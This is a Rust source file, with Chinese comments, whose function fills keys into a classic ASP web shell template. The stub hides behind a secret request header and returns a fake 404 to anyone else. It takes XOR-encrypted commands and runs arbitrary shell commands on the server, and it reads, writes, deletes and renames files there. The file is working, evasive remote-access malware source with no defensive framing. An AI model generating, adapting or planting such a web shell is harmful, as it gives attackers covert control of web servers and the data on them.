//! 经典 ASP（VBScript）协议 stub 模板（NativeEncoder 的 asp 分支）。
//! 载荷协议与 PHP native 一致：formData（XOR 密文）+ X-Debug-Key 头鉴权。
//! VBScript 无内置 JSON/base64/md5：操作分发用字符串直接比较（免 MD5），
//! base64 纯 VBScript 实现，文件 I/O 用 FSO + ADODB.Stream。

#[allow(clippy::too_many_arguments)]
pub fn asp_stub(xk: &str, gk_hex: &str, token_hex: &str, key_hex: &str) -> String {
    const TPL: &str = r#"<%@ Language="VBScript" %>
<% Option Explicit
' --- 工具函数 ---
Function DecHex(hexStr, k)
  Dim i, v, outv
  outv = ""
  For i = 1 To Len(hexStr) Step 2
    v = CInt("&H" & Mid(hexStr, i, 2)) Xor Asc(Mid(k, ((i - 1) \ 2) Mod Len(k) + 1, 1))
    outv = outv & Chr(v)
  Next
  DecHex = outv
End Function
Function StrToBytes(s)
  Dim i, arr
  ' 空串必须返回零长度数组：ReDim arr(-1) 在 VBScript 中是运行时错误，
  ' 会让"空输出命令"（true / mkdir / 空文件读取）整体失败
  If Len(s) = 0 Then
    StrToBytes = Array()
    Exit Function
  End If
  ReDim arr(Len(s) - 1)
  For i = 1 To Len(s)
    arr(i - 1) = Asc(Mid(s, i, 1))
  Next
  StrToBytes = arr
End Function
Function BytesToStr(arr)
  Dim i, s
  s = ""
  If IsEmpty(arr) Then
    BytesToStr = s
    Exit Function
  End If
  For i = 0 To UBound(arr)
    s = s & Chr(arr(i))
  Next
  BytesToStr = s
End Function
Function XorBytes(arr, keyArr)
  Dim i, outArr
  ReDim outArr(UBound(arr))
  For i = 0 To UBound(arr)
    outArr(i) = arr(i) Xor keyArr(i Mod (UBound(keyArr) + 1))
  Next
  XorBytes = outArr
End Function
Function B64Decode(s)
  Dim tbl, i, n, pad, outLen, outArr, oi, ch, clean, acc, j, v
  tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  clean = ""
  For i = 1 To Len(s)
    ch = Mid(s, i, 1)
    If InStr(tbl, ch) > 0 Or ch = "=" Then clean = clean & ch
  Next
  pad = 0
  If Len(clean) >= 2 Then
    If Right(clean, 2) = "==" Then pad = 2 ElseIf Right(clean, 1) = "=" Then pad = 1
  End If
  outLen = (Len(clean) \ 4) * 3 - pad
  If outLen <= 0 Then
    B64Decode = Array()
    Exit Function
  End If
  ReDim outArr(outLen - 1)
  oi = 0
  i = 1
  While i < Len(clean)
    acc = 0
    For j = 0 To 3
      acc = acc * 64
      ch = Mid(clean, i + j, 1)
      If ch <> "=" Then acc = acc + (InStr(tbl, ch) - 1)
    Next
    outArr(oi) = (acc \ 65536) And 255
    oi = oi + 1
    If oi < outLen Then
      outArr(oi) = (acc \ 256) And 255
      oi = oi + 1
    End If
    If oi < outLen Then
      outArr(oi) = acc And 255
      oi = oi + 1
    End If
    i = i + 4
  Wend
  B64Decode = outArr
End Function
Function B64Encode(arr)
  Dim tbl, i, outv, b1, b2, b3, n, c1, c2, c3, c4
  tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  outv = ""
  i = 0
  While i <= UBound(arr)
    b1 = arr(i)
    If i + 1 <= UBound(arr) Then b2 = arr(i + 1) Else b2 = -1
    If i + 2 <= UBound(arr) Then b3 = arr(i + 2) Else b3 = -1
    n = b1 * 65536
    If b2 >= 0 Then n = n + b2 * 256
    If b3 >= 0 Then n = n + b3
    c1 = (n \ 262144) And 63
    c2 = (n \ 4096) And 63
    c3 = (n \ 64) And 63
    c4 = n And 63
    outv = outv & Mid(tbl, c1 + 1, 1) & Mid(tbl, c2 + 1, 1)
    If b2 >= 0 Then outv = outv & Mid(tbl, c3 + 1, 1) Else outv = outv & "="
    If b3 >= 0 Then outv = outv & Mid(tbl, c4 + 1, 1) Else outv = outv & "="
    i = i + 3
  Wend
  B64Encode = outv
End Function
Function GetVal(json, key)
  Dim mark, i, outv, c
  mark = """" & key & """:"""
  i = InStr(json, mark)
  If i = 0 Then
    GetVal = ""
    Exit Function
  End If
  i = i + Len(mark)
  outv = ""
  While i <= Len(json)
    c = Mid(json, i, 1)
    If c = "\" Then
      If i < Len(json) Then outv = outv & Mid(json, i + 1, 1)
      i = i + 2
    ElseIf c = """" Then
      Exit While
    Else
      outv = outv & c
      i = i + 1
    End If
  Wend
  GetVal = outv
End Function
Function EscJson(s)
  s = Replace(s, "\", "\\")
  s = Replace(s, """", "\""")
  s = Replace(s, vbCr, "\r")
  s = Replace(s, vbLf, "\n")
  s = Replace(s, vbTab, "\t")
  EscJson = s
End Function
' --- 功能 ---
Function DoCwd()
  On Error Resume Next
  Dim fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  DoCwd = fso.GetAbsolutePathName(".")
End Function
Function DoEnv()
  On Error Resume Next
  Dim cwd, ver
  cwd = DoCwd()
  ver = ScriptEngine() & " " & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion
  DoEnv = "{""ok"":true,""data"":{""server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""web_server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""php_version"":""" & EscJson(ver) & """,""current_dir"":""" & EscJson(cwd) & """,""separator"":""\\"",""info"":{""ProtoVersion"":""2"",""Capabilities"":""chunked,stream,plugin,exec"",""ShellType"":""file""}}}"
End Function
Function DoExec(c, w)
  On Error Resume Next
  Dim sh, p, outv, bytes, m, t, fso
  If w <> "" Then
    Set sh = CreateObject("WScript.Shell")
    On Error Resume Next
    sh.CurrentDirectory = w
    On Error Resume Next
  End If
  If Left(Trim(c), 2) = "cd" And (Len(Trim(c)) = 2 Or Mid(Trim(c), 3, 1) = " ") Then
    t = Trim(Mid(c, 3))
    If t <> "" Then
      Set fso = CreateObject("Scripting.FileSystemObject")
      ' 相对路径拼到当前工作目录下：VBScript 无反斜杠转义，字面量就是 "\"；
      ' 原实现写成空串（""），既不判反斜杠也不补分隔符 → cd sub 得到 C:\wwwsub
      If Left(t, 1) <> "\" And Left(t, 1) <> "/" Then
        If w <> "" Then
          If Right(w, 1) <> "\" And Right(w, 1) <> "/" Then t = w & "\" & t Else t = w & t
        End If
      End If
      DoExec = "{""ok"":true,""data"":{""stdout"":"""",""cwd"":""" & EscJson(fso.GetAbsolutePathName(t)) & """}}"
      Exit Function
    End If
  End If
  Set sh = CreateObject("WScript.Shell")
  Set p = sh.Exec(c)
  outv = p.StdOut.ReadAll
  If Err.Number <> 0 Then
    DoExec = "{""ok"":false,""error"":""exec failed: " & EscJson(Err.Description) & """}"
    Exit Function
  End If
  bytes = StrToBytes(outv)
  DoExec = "{""ok"":true,""data"":{""stdout"":""" & B64Encode(bytes) & """,""cwd"":""" & EscJson(DoCwd()) & """}}"
End Function
Function DoList(p)
  On Error Resume Next
  Dim fso, fld, f, sf, outv, first
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set fld = fso.GetFolder(p)
  outv = "{""ok"":true,""data"":{""entries"":["
  first = True
  For Each f In fld.Files
    If Not first Then outv = outv & ","
    first = False
    outv = outv & "{""name"":""" & EscJson(f.Name) & """,""path"":""" & EscJson(f.Path) & """,""is_dir"":false,""size"":" & f.Size & ",""mtime"":" & CLng(CDate(f.DateLastModified) - CDate("1970-1-1")) * 86400 & "}"
  Next
  For Each sf In fld.SubFolders
    If Not first Then outv = outv & ","
    first = False
    outv = outv & "{""name"":""" & EscJson(sf.Name) & """,""path"":""" & EscJson(sf.Path) & """,""is_dir"":true,""size"":0,""mtime"":0}"
  Next
  outv = outv & "]}}"
  If Err.Number <> 0 Then
    DoList = "{""ok"":false,""error"":""list failed: " & EscJson(Err.Description) & """}"
    Exit Function
  End If
  DoList = outv
End Function
Function DoRead(p, o, l)
  On Error Resume Next
  Dim st, bytes
  Set st = CreateObject("ADODB.Stream")
  st.Type = 1
  st.Open
  st.LoadFromFile p
  If o <> "" And IsNumeric(o) Then
    st.Position = CLng(o)
  End If
  If l <> "" And IsNumeric(l) Then
    bytes = st.Read(CLng(l))
  Else
    bytes = st.Read
  End If
  st.Close
  If Err.Number <> 0 Then
    DoRead = "{""ok"":false,""error"":""read failed""" 
    Exit Function
  End If
  DoRead = "{""ok"":true,""data"":""" & B64Encode(bytes) & """}"
End Function
Function DoWrite(p, d, o)
  On Error Resume Next
  Dim arr, st
  arr = B64Decode(d)
  Set st = CreateObject("ADODB.Stream")
  st.Type = 1
  st.Open
  If o <> "" And IsNumeric(o) And o > 0 Then
    ' 分块写：加载现有文件，定位后覆盖
    st.LoadFromFile p
    st.Position = CLng(o)
    st.Write arr
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(p) Then fso.DeleteFile p, True
    st.SaveToFile p, 2
  Else
    st.Write arr
    st.SaveToFile p, 2
  End If
  st.Close
  If Err.Number <> 0 Then
    DoWrite = "{""ok"":false,""error"":""write failed: " & EscJson(Err.Description) & """}"
    Exit Function
  End If
  DoWrite = "{""ok"":true,""data"":null}"
End Function
Function DoDel(p)
  On Error Resume Next
  Dim fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  If fso.FolderExists(p) Then
    fso.DeleteFolder p, True
  Else
    fso.DeleteFile p, True
  End If
  If Err.Number <> 0 Then
    DoDel = "{""ok"":false,""error"":""delete failed""" 
    Exit Function
  End If
  DoDel = "{""ok"":true,""data"":null}"
End Function
Function DoRen(f, t)
  On Error Resume Next
  Dim fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  fso.MoveFile f, t
  If Err.Number <> 0 Then
    Err.Clear
    fso.MoveFolder f, t
  End If
  If Err.Number <> 0 Then
    DoRen = "{""ok"":false,""error"":""rename failed""" 
    Exit Function
  End If
  DoRen = "{""ok"":true,""data"":null}"
End Function
Function DoMkdir(p)
  On Error Resume Next
  Dim fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  fso.CreateFolder p
  If Err.Number <> 0 Then
    DoMkdir = "{""ok"":false,""error"":""mkdir failed""" 
    Exit Function
  End If
  DoMkdir = "{""ok"":true,""data"":null}"
End Function
' --- 入口 ---
Dim xk, hname, token, fd, key, inArr, plain, req, action, outv, respArr
xk = "__XK__"
hname = DecHex("__GK__", xk)
token = Request.ServerVariables(hname)
If token <> DecHex("__TOKEN__", xk) Then
  Response.Status = "404 Not Found"
  Response.End
End If
fd = Request.Form("formData")
If fd = "" Then Response.End
key = StrToBytes(DecHex("__KEY__", xk))
inArr = B64Decode(fd)
plain = BytesToStr(XorBytes(inArr, key))
action = GetVal(plain, "a")
outv = "{""ok"":false,""error"":""unsupported""}"
If action = "probe" Then
  outv = DoEnv()
ElseIf action = "exec" Then
  outv = DoExec(GetVal(plain, "c"), GetVal(plain, "w"))
ElseIf action = "list" Then
  outv = DoList(GetVal(plain, "p"))
ElseIf action = "read" Then
  outv = DoRead(GetVal(plain, "p"), GetVal(plain, "o"), GetVal(plain, "l"))
ElseIf action = "write" Then
  outv = DoWrite(GetVal(plain, "p"), GetVal(plain, "d"), GetVal(plain, "o"))
ElseIf action = "delete" Then
  outv = DoDel(GetVal(plain, "p"))
ElseIf action = "rename" Then
  outv = DoRen(GetVal(plain, "f"), GetVal(plain, "t"))
ElseIf action = "mkdir" Then
  outv = DoMkdir(GetVal(plain, "p"))
End If
respArr = XorBytes(StrToBytes(outv), key)
Response.Write "{""data"":""" & B64Encode(respArr) & """,""code"":200}"
%>
"#;
    TPL.replace("__XK__", xk)
        .replace("__GK__", gk_hex)
        .replace("__TOKEN__", token_hex)
        .replace("__KEY__", key_hex)
}
